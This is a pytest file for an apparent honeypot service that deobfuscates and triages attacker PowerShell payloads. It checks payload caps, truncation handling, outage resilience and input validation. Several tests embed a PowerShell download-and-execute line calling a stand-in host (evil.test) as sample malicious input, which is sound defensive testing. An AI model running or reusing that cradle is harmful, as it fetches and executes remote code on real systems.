import json
from fastapi.testclient import TestClient
from grounding_service.app import create_app
from grounding_service.config import Settings


def _client(seeded_retriever, tmp_path, factory=None):
    s = Settings(runs_path=str(tmp_path / "runs.jsonl"))
    return TestClient(create_app(seeded_retriever, s, deobf_client_factory=factory))


def test_deobfuscate_builtin_no_client(seeded_retriever, tmp_path):
    c = _client(seeded_retriever, tmp_path, factory=None)
    r = c.post("/deobfuscate", json={"payload": "powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAgAA=="})
    body = r.json()
    assert r.status_code == 200
    assert body["final_plaintext"] == "Write-Host "
    assert body["verdict_inputs"]["fully_resolved"] is True


def test_deobfuscate_survives_client_outage(seeded_retriever, tmp_path):
    def boom():
        raise RuntimeError("no key")
    c = _client(seeded_retriever, tmp_path, factory=boom)
    r = c.post("/deobfuscate", json={"payload": "powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAgAA=="})
    assert r.status_code == 200 and r.json()["final_plaintext"] == "Write-Host "


def test_deobfuscate_survives_midcall_outage(seeded_retriever, tmp_path):
    # Distinct from test_deobfuscate_survives_client_outage: the FACTORY succeeds
    # (returns a client), but that client's messages.create() raises mid-decode
    # (rate-limit/network/5xx). A DeflateStream-style payload trips the prefilter
    # (has_encoded_payload True) but has no builtin recognizer and no [char]
    # tokens (try_builtin returns None), so the gate must consult the client and
    # hit the raising create() call. F6: this must NOT propagate to HTTP 500.
    class _RaisingClient:
        def __init__(self):
            self.messages = self

        def create(self, **kwargs):
            raise RuntimeError("mid-decode outage")

    c = _client(seeded_retriever, tmp_path, factory=_RaisingClient)
    payload = "New-Object IO.Compression.DeflateStream decode"
    r = c.post("/deobfuscate", json={"payload": payload})
    assert r.status_code == 200
    body = r.json()
    assert body["verdict_inputs"]["fully_resolved"] is False
    assert "residual-encoding" in body["flags"]


def test_triage_verdict_rejects_malformed_hit(seeded_retriever, tmp_path):
    # D5/F7: a behavioral hit missing rule_id must NOT be silently dropped (that
    # could launder a suspicious verdict into a clean one). Today (pre-fix) this
    # raises a bare KeyError -> HTTP 500; post-fix it's a clean 422.
    c = _client(seeded_retriever, tmp_path)
    r = c.post("/triage-verdict", json={
        "behavioral_hits": [{"category": "exec", "evidence": "IEX"}],
        "ioc_verdicts": {}, "fully_resolved": True, "flags": []})
    assert r.status_code == 422


def test_deobfuscate_caps_payload(seeded_retriever, tmp_path):
    # F4/D2/D6: /deobfuscate must cap the attacker payload before feeding the
    # engine, and max_bytes must NOT be usable to raise the cap above the config
    # ceiling (65536). The CRITICAL D4 interaction: capping must not silently
    # false-clean a payload whose malice sits PAST the cap -- truncation floors
    # the verdict to unknown.
    c = _client(seeded_retriever, tmp_path, factory=None)
    prefix = "hello world " * 6000          # 72,000 chars, benign + unencoded
    tail = " IEX(New-Object Net.WebClient).DownloadString('http://evil.test/x')"
    payload = prefix + tail                  # malicious tail sits well past the 65536 cap
    # max_bytes way over the ceiling: attacker must not be able to raise the cap
    r = c.post("/deobfuscate", json={"payload": payload, "max_bytes": 10_000_000})
    assert r.status_code == 200
    body = r.json()
    # processed length respects the config ceiling, not the attacker's max_bytes
    assert len(body["final_plaintext"]) <= 65536
    assert len(body["final_plaintext"]) < len(payload)
    # the malicious tail was chopped, so nothing from past the cap leaked
    assert body["iocs"] == []
    assert body["verdict_inputs"]["behavioral_hits"] == []
    # ...but truncation is signalled so the verdict floors to unknown (no false clean)
    assert "truncated" in body["flags"]
    vi = body["verdict_inputs"]
    v = c.post("/triage-verdict", json={
        "behavioral_hits": vi["behavioral_hits"],
        "ioc_verdicts": {},
        "fully_resolved": vi["fully_resolved"],
        "flags": vi["flags"],
    }).json()
    assert v["verdict"] == "unknown"          # NOT "clean"


def test_triage_verdict_vt_malicious_ioc_still_escalates(seeded_retriever, tmp_path):
    # Renamed from the old test_triage_verdict_is_pure (F9/D7): this only proves the
    # vt_max==3 short-circuit in fuse() still wins over a behavioral hit -- it does NOT
    # prove behavioral hits are honored or that free-text is ignored (both are covered
    # by the two discriminating tests below, which is what actually closes F9).
    c = _client(seeded_retriever, tmp_path)
    r = c.post("/triage-verdict", json={
        "behavioral_hits": [{"rule_id": "exec.iex", "category": "exec", "evidence": "IEX"}],
        "ioc_verdicts": {"http://x": "malicious"},
        "fully_resolved": True, "flags": []})
    assert r.json()["verdict"] == "malicious"


def test_triage_verdict_purity_behavioral_hit_escalates_without_malicious_ioc(seeded_retriever, tmp_path):
    # F9/D7 (a): a behavioral hit ALONE, with NO malicious IOC in play, must escalate
    # to suspicious. RED if the endpoint/fuse ever stopped honoring behavioral_hits
    # (the old test only exercised the vt_max==3 short-circuit and would have passed
    # even if behavioral_hits were ignored entirely).
    c = _client(seeded_retriever, tmp_path)
    r = c.post("/triage-verdict", json={
        "behavioral_hits": [{"rule_id": "exec.iex", "category": "exec", "evidence": "IEX"}],
        "ioc_verdicts": {}, "fully_resolved": True, "flags": []})
    assert r.json()["verdict"] == "suspicious"


def test_deobfuscate_rejects_nonpositive_max_bytes(seeded_retriever, tmp_path):
    # H-ITEM1: max_bytes=0 must not be swallowed by the old `req.max_bytes or
    # ceiling` truthiness gap (0 is falsy, so it used to silently process the
    # FULL 65536-byte ceiling instead of rejecting a "give me 0 bytes" request).
    # A negative max_bytes is also a malformed request, not a valid tiny cap
    # (it used to chop payload[:-N] off the END and always mark truncated).
    # Both must 422 at the pydantic layer, before the handler ever runs.
    c = _client(seeded_retriever, tmp_path)
    r_zero = c.post("/deobfuscate", json={"payload": "hello", "max_bytes": 0})
    assert r_zero.status_code == 422
    r_neg = c.post("/deobfuscate", json={"payload": "hello", "max_bytes": -1})
    assert r_neg.status_code == 422


def test_deobfuscate_raw_lone_surrogate_does_not_500(seeded_retriever, tmp_path):
    # H-ITEM2: a raw lone surrogate in the request body (e.g. a stray half of a
    # UTF-16 pair) never goes through char_array decoding, so it flows straight
    # into final_plaintext. Starlette's JSONResponse render does
    # json.dumps(..., ensure_ascii=False).encode("utf-8"), and a lone surrogate
    # can't be UTF-8 encoded -> UnicodeEncodeError -> HTTP 500. This is
    # availability-only (a crash, not a false-clean): the honeypot has to keep
    # triaging attacker payloads instead of falling over on one weird byte.
    c = _client(seeded_retriever, tmp_path)
    r = c.post("/deobfuscate", content='{"payload":"\\ud800"}',
                headers={"content-type": "application/json"})
    assert r.status_code == 200
    r.json()  # must still be valid, decodable JSON


def test_deobfuscate_max_bytes_below_ceiling_isolates_tail(seeded_retriever, tmp_path):
    # H-ITEM3: test_deobfuscate_caps_payload only uses max_bytes WAY ABOVE the
    # 65536 ceiling, so it only proves the ceiling clamp -- it would still pass
    # even if the app-level min(req.max_bytes, ceiling) clamp were deleted
    # entirely, because gate.decode_and_verify has its own defensive backstop
    # that chops at the 65536 ceiling regardless. Here max_bytes is SMALLER
    # than the ceiling, so only the app-level clamp (not the gate backstop) can
    # produce this chop -- this is what actually isolates/proves it.
    c = _client(seeded_retriever, tmp_path)
    prefix = "benign " * 50                  # 350 chars, no encoding markers
    max_bytes = len(prefix)                  # 350, well under the 65536 ceiling
    tail = " IEX(New-Object Net.WebClient).DownloadString('http://evil.test/x')"
    payload = prefix + tail                  # malicious tail starts at offset 350 (== max_bytes)
    r = c.post("/deobfuscate", json={"payload": payload, "max_bytes": max_bytes})
    assert r.status_code == 200
    body = r.json()
    assert len(body["final_plaintext"]) <= max_bytes
    # the malicious tail sat past max_bytes, so nothing from it leaked
    assert body["iocs"] == []
    assert body["verdict_inputs"]["behavioral_hits"] == []
    # ...but truncation is signalled so the verdict floors to unknown, not clean
    assert "truncated" in body["flags"]


def test_triage_verdict_purity_extra_free_text_key_is_ignored(seeded_retriever, tmp_path):
    # F9/D7 (b): a well-formed benign body (no malicious IOC, no behavioral hit) plus
    # an EXTRA unknown JSON key carrying hostile-looking free text must still verdict
    # clean. Proves pydantic drops the unmodeled field and fuse() never reads it --
    # RED if TriageVerdictRequest ever grew an advisory-intent field that leaked into
    # fuse() or the endpoint started reading arbitrary extra keys.
    c = _client(seeded_retriever, tmp_path)
    r = c.post("/triage-verdict", json={
        "behavioral_hits": [], "ioc_verdicts": {}, "fully_resolved": True, "flags": [],
        "advisory_intent": "IEX(New-Object Net.WebClient).DownloadString('http://evil.test/x')",
    })
    assert r.json()["verdict"] == "clean"
